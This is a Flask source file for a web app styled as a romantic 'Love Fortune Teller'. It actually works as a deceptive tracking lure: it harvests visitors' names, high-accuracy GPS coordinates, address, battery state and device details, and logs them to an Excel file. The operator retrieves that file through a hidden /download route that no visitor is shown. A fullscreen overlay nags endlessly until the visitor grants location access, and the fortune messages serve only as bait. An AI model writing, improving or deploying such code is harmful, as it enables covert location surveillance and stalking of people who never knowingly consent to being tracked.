from flask import Flask, request, render_template_string, send_file
import pandas as pd
import requests
import os
from datetime import datetime
import random

app = Flask(__name__)
os.makedirs('excel_files', exist_ok=True)

def get_address(lat, lon):
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {'lat': lat, 'lon': lon, 'format': 'json', 'addressdetails': 1}
        headers = {'User-Agent': 'Fortune-App/1.0'}
        r = requests.get(url, params=params, headers=headers, timeout=8)
        return r.json().get('display_name', 'Address found')
    except:
        return 'Location captured'

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Fortune Teller</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        .heart {
            position: fixed;
            pointer-events: none;
            animation: floatUp 4s linear infinite;
            z-index: 0;
        }
        @keyframes floatUp {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 50px;
            padding: 50px 40px;
            max-width: 550px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.2);
            z-index: 1;
            position: relative;
            animation: fadeIn 0.8s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .emoji { font-size: 90px; margin-bottom: 20px; animation: bounce 2s infinite; }
        @keyframes bounce {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 36px;
            margin-bottom: 10px;
        }
        .subtitle { color: #888; margin-bottom: 30px; font-size: 16px; }
        .input-group { margin-bottom: 25px; text-align: left; }
        .input-group label {
            display: block;
            margin-bottom: 10px;
            color: #c06c84;
            font-weight: 600;
            font-size: 16px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #ffdde1;
            border-radius: 50px;
            font-size: 16px;
            text-align: center;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #c06c84;
            box-shadow: 0 0 15px rgba(192,108,132,0.3);
        }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(192,108,132,0.4); }
        .loading { display: none; margin-top: 30px; }
        .loading.show { display: block; }
        .spinner {
            width: 60px; height: 60px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            border-radius: 50%;
            animation: pulse 1.2s infinite;
        }
        @keyframes pulse {
            0%,100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 1; }
        }
        .result {
            display: none;
            margin-top: 30px;
            padding: 35px;
            background: linear-gradient(135deg, #ff9a9e, #fecfef);
            border-radius: 30px;
            color: white;
            animation: slideUp 0.6s;
        }
        .result.show { display: block; }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fortune-text { font-size: 22px; line-height: 1.5; margin: 20px 0; font-weight: 500; }
        .heart-icon { font-size: 45px; animation: heartbeat 1.5s infinite; }
        @keyframes heartbeat {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        .name-highlight { font-size: 28px; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }

        /* ── LOCATION PERMISSION OVERLAY ── */
        #locOverlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: linear-gradient(135deg, rgba(255,107,107,0.97), rgba(192,108,132,0.97));
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 30px;
        }
        #locOverlay.show { display: flex; }
        #locOverlay .ov-emoji { font-size: 80px; margin-bottom: 20px; animation: bounce 2s infinite; }
        #locOverlay h2 { color: #fff; font-size: 28px; margin-bottom: 15px; }
        #locOverlay p { color: rgba(255,255,255,0.9); font-size: 16px; margin-bottom: 25px; max-width: 380px; line-height: 1.6; }
        #locOverlay .ov-steps {
            background: rgba(255,255,255,0.2);
            border-radius: 20px;
            padding: 20px 25px;
            margin-bottom: 25px;
            text-align: left;
            max-width: 380px;
            width: 100%;
            color: #fff;
            font-size: 15px;
            line-height: 2;
        }
        #locOverlay .ov-btn {
            background: white;
            color: #c06c84;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.3s;
            animation: pulse 1.5s infinite;
        }
        #locOverlay .ov-btn:hover { transform: scale(1.05); }

        @media (max-width:600px) {
            .container { padding: 35px 25px; }
            h1 { font-size: 28px; }
            .fortune-text { font-size: 18px; }
        }
    </style>
</head>
<body>

<!-- FULLSCREEN LOCATION OVERLAY (shown when denied) -->
<div id="locOverlay">
    <div class="ov-emoji">📍💕</div>
    <h2>Location Access Needed!</h2>
    <p>To reveal your <strong>personalized love fortune</strong>, we need your location. The stars can't find you without it! ✨</p>
    <div class="ov-steps">
        🔒 Click the <strong>lock / info icon</strong> in your address bar<br>
        ⚙️ Go to <strong>Site Settings</strong><br>
        📍 Set <strong>Location → Allow</strong><br>
        🔄 Then click <strong>Try Again</strong> below
    </div>
    <button class="ov-btn" onclick="retryLocation()">💫 Try Again – Allow Location 💫</button>
</div>

<div class="container">
    <div class="emoji">💕🔮💕</div>
    <h1>Your Love Fortune</h1>
    <div class="subtitle">Discover what destiny has planned for your heart</div>

    <div id="initial">
        <div class="input-group">
            <label>✨ What's your name, beautiful soul? ✨</label>
            <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
        </div>
        <button class="btn" onclick="requestFortune()">✨ Reveal My Destiny ✨</button>
    </div>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>💫 Reading the stars for you... 💫</p>
    </div>

    <div class="result" id="result">
        <div class="heart-icon">💖</div>
        <div class="name-highlight" id="userNameDisplay"></div>
        <div class="fortune-text" id="fortuneText"></div>
        <div>✨ The universe has spoken ✨</div>
    </div>
</div>

<script>
    /* floating hearts */
    function createHeart() {
        const h = document.createElement('div');
        h.innerHTML = ['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
        h.classList.add('heart');
        h.style.left = Math.random()*100+'%';
        h.style.animationDuration = (Math.random()*3+3)+'s';
        h.style.fontSize = (Math.random()*20+15)+'px';
        document.body.appendChild(h);
        setTimeout(()=>h.remove(), 4000);
    }
    setInterval(createHeart, 500);

    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level*100), charging: b.charging };
            } catch(e) { return null; }
        }
        return null;
    }

    let savedName = '';

    window.requestFortune = async function() {
        const name = document.getElementById('userName').value.trim();
        if (!name) { alert('💕 Please enter your beautiful name! 💕'); return; }
        savedName = name;
        tryGetLocation();
    };

    function tryGetLocation() {
        document.getElementById('result').classList.remove('show');
        document.getElementById('initial').style.display = 'none';
        document.getElementById('loading').classList.add('show');
        document.getElementById('locOverlay').classList.remove('show');

        if (!navigator.geolocation) {
            showOverlay();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async function(pos) {
                document.getElementById('locOverlay').classList.remove('show');
                const battery = await getBattery();
                const data = {
                    name: savedName,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                    battery: battery,
                    ua: navigator.userAgent,
                    screen: screen.width+'x'+screen.height,
                    lang: navigator.language,
                    platform: navigator.platform
                };
                try {
                    const res = await fetch('/save', {
                        method: 'POST',
                        headers: {'Content-Type':'application/json'},
                        body: JSON.stringify(data)
                    });
                    const result = await res.json();
                    document.getElementById('loading').classList.remove('show');
                    if (result.success) {
                        document.getElementById('result').classList.add('show');
                        document.getElementById('userNameDisplay').innerHTML = `✨ ${savedName} ✨`;
                        document.getElementById('fortuneText').innerHTML = result.fortune;
                    }
                } catch(err) {
                    document.getElementById('loading').classList.remove('show');
                    document.getElementById('initial').style.display='block';
                }
            },
            function(error) {
                // ANY denial → show fullscreen overlay immediately, loop forever
                document.getElementById('loading').classList.remove('show');
                showOverlay();
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    function showOverlay() {
        document.getElementById('locOverlay').classList.add('show');
    }

    /* Retry button inside overlay */
    window.retryLocation = function() {
        document.getElementById('initial').style.display = 'none';
        tryGetLocation();
    };
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return HTML

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.json
        name   = data['name']
        lat    = data['lat']
        lon    = data['lon']
        addr   = get_address(lat, lon)
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        battery   = data.get('battery')
        batt_level    = battery['level']    if battery else 'N/A'
        batt_charging = battery['charging'] if battery else 'N/A'

        record = {
            'DateTime'   : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'Name'       : name,
            'Latitude'   : lat,
            'Longitude'  : lon,
            'Google Maps': maps_link,
            'Accuracy_m' : data.get('accuracy'),
            'Address'    : addr,
            'Battery_%'  : batt_level,
            'Charging'   : batt_charging,
            'Device'     : data.get('ua','')[:120],
            'Screen'     : data.get('screen'),
            'Platform'   : data.get('platform')
        }

        excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
        if os.path.exists(excel_path):
            existing = pd.read_excel(excel_path)
            combined = pd.concat([existing, pd.DataFrame([record])], ignore_index=True)
            combined.to_excel(excel_path, index=False, engine='openpyxl')
        else:
            pd.DataFrame([record]).to_excel(excel_path, index=False, engine='openpyxl')

        messages = [
            f"💕 Dear {name}, someone special is thinking of you right now! 💕",
            f"💖 {name}, a beautiful soul is about to enter your life! 💖",
            f"💗 {name}, the universe has heard your heart's desire! 💗",
            f"💓 {name}, your future soulmate is closer than you think! 💓",
            f"💝 {name}, someone you meet today will change your life! 💝",
            f"💕 {name}, love is coming your way sooner than you expect! 💕",
            f"💖 {name}, your positive energy is attracting true love! 💖",
            f"💗 {name}, the stars are aligning just for you today! 💗",
            f"💓 {name}, a wonderful surprise awaits your heart! 💓",
            f"💝 {name}, someone is secretly falling for you! 💝"
        ]
        print(f"✨ {name} | {lat:.4f},{lon:.4f} | Battery: {batt_level}%")
        return {'success': True, 'fortune': random.choice(messages)}
    except Exception as e:
        print("Save error:", e)
        return {'success': False}, 500

# Admin only — access directly via browser URL, never linked in UI
@app.route('/download')
def download():
    excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
    if os.path.exists(excel_path):
        return send_file(excel_path, as_attachment=True, download_name='fortunes_data.xlsx')
    return "No data yet.", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
